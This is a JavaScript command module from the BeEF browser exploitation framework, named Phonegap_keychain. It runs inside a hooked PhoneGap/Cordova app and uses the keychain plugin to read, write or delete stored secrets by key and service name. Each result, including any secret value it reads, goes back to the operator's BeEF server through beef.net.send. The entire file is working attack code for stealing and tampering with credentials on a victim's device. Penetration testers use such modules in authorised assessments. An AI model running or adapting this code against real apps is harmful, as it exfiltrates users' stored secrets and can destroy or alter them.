//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_keychain
//
beef.execute(function() {
    var servicename = "<%== @servicename %>";
    var key = "<%== @key %>";
    var value = "<%== @value %>";
    var action = "<%== @action %>";
    var result = '';
    var kc = '';

    try {
        kc = cordova.require("cordova/plugin/keychain");
    } catch (err) {
        result = 'Unable to access keychain plugin';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
    }

    function onGet()
    {  
        var win = function(value) {
            result = result + "GET SUCCESS - Key: " + key + " Value: " + value;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 

        };
        var fail = function(error) {
            result = result + "GET FAIL - Key: " + key + " Error: " + error;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
        };
        
        kc.getForKey(win, fail, key, servicename);

    }
    
    function onSet()
    {        
        var win = function() {
            result = result + "SET SUCCESS - Key: " + key;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
        };
        var fail = function(error) {
            result = result + "SET FAIL - Key: " + key + " Error: " + error;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
        };
        
        kc.setForKey(win, fail, key, servicename, value);
    }
    
    function onRemove()
    {
        var win = function() {
            result = result + "REMOVE SUCCESS - Key: " + key;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
        };
        var fail = function(error) {
            result = result + "REMOVE FAIL - Key: " + key + " Error: " + error;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
        };
        
        kc.removeForKey(win, fail, key, servicename);
    }

    if (kc !== undefined)  {
        switch(action) {
            case 'Read':
                onGet();
                break;
            case 'CreateUpdate':
                onSet();
                break;
            case 'Delete':
                onRemove();
                break;
        }
    } 

});
